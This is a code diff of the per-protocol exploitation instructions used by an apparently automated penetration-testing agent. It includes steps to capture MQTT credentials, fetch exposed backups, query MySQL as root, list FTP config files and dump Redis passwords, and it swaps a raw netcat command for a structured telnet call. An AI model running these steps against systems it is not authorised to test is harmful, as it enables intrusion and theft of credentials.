@@ -42,7 +42,7 @@ EXPLOIT_INSTRUCTIONS: dict[str, dict[str, str]] = {
     "data_access": {
         "mqtt": "For MQTT no_auth (port 1883): mqtt_listen(broker=\"{ip}\", topic=\"#\", count=10, timeout=8) — capture messages, extract credentials/keys\n",
         "http": "For HTTP data_exposure: http_get(URL) using URLs from Phase 3 evidence. If evidence mentions /backup/file.sql, use http_get(\"http://{ip}/backup/file.sql\")\nFor HTTP directory_listing: http_get(base_url) first to confirm, then http_get(listed_file_url) for each listed file\nIf the URL from evidence returns 404, mark the Phase 4 attempt as FAILED and preserve the 404 as evidence.",
-        "telnet": "For Telnet (port 23): telnet_connect(\"echo quit | timeout 3 nc {ip} 23\") — show session\n",
+        "telnet": "For Telnet (port 23): telnet_connect(host=\"{ip}\", port=23, timeout=3) — require received bytes; a connection or timeout alone is inconclusive\n",
         "mysql": "For MySQL/MariaDB (port 3306): mysql_query(host=\"{ip}\", user=\"root\", query=\"SHOW DATABASES;\", skip_ssl=true) — show data\n",
         "ftp": "For FTP (port 21): ftp_list(\"ftp://{ip}/\") then ftp_list(\"ftp://{ip}/config/\") — show files\n",
         "redis": "For Redis (port 6379): redis_cmd(host=\"{ip}\", command=\"KEYS *\") then redis_cmd(host=\"{ip}\", command=\"GET config:db_password\") — dump sensitive keys\n",
